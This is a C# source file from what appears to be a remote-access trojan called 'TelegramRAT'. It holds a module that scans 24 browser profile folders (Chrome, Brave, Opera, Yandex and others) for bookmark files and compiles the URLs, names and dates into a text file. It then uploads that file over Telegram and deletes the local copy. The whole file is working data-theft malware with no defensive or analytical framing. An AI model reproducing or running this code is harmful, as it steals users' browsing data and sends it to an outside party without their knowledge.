using System;
using System.IO;
using SimpleJSON;

namespace TelegramRAT;

internal class Bookmarks
{
	public static void get()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		string text3 = "\\User Data\\Default\\Bookmarks";
		string[] obj = new string[24]
		{
			text2 + "Google\\Chrome" + text3,
			text2 + "Google(x86)\\Chrome" + text3,
			text2 + "Chromium" + text3,
			text + "Opera Software\\Opera Stable\\Bookmarks",
			text2 + "BraveSoftware\\Brave-Browser" + text3,
			text2 + "Epic Privacy Browser" + text3,
			text2 + "Amigo" + text3,
			text2 + "Vivaldi" + text3,
			text2 + "Orbitum" + text3,
			text2 + "Mail.Ru\\Atom" + text3,
			text2 + "Kometa" + text3,
			text2 + "Comodo\\Dragon" + text3,
			text2 + "Torch" + text3,
			text2 + "Comodo" + text3,
			text2 + "Slimjet" + text3,
			text2 + "360Browser\\Browser" + text3,
			text2 + "Maxthon3" + text3,
			text2 + "K-Melon" + text3,
			text2 + "Sputnik\\Sputnik" + text3,
			text2 + "Nichrome" + text3,
			text2 + "CocCoc\\Browser" + text3,
			text2 + "uCozMedia\\Uran" + text3,
			text2 + "Chromodo" + text3,
			text2 + "Yandex\\YandexBrowser" + text3
		};
		string text4 = "bookmarks.txt";
		string text5 = "[BOOKMARKS]\n\n";
		string[] array = obj;
		foreach (string path in array)
		{
			if (File.Exists(path))
			{
				JSONNode.Enumerator enumerator = JSON.Parse(File.ReadAllText(path))["roots"]["bookmark_bar"]["children"].GetEnumerator();
				while (enumerator.MoveNext())
				{
					JSONNode jSONNode = enumerator.Current;
					text5 = string.Concat(text5, "URL: ", jSONNode["url"], "\nNAME: ", jSONNode["name"], "\nDATE: ", Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10L * Convert.ToInt64((string)jSONNode["date_added"])), TimeZoneInfo.Local)), "\n\n");
				}
			}
		}
		File.WriteAllText(text4, text5);
		telegram.UploadFile(text4, removeAfterUpload: true);
	}
}
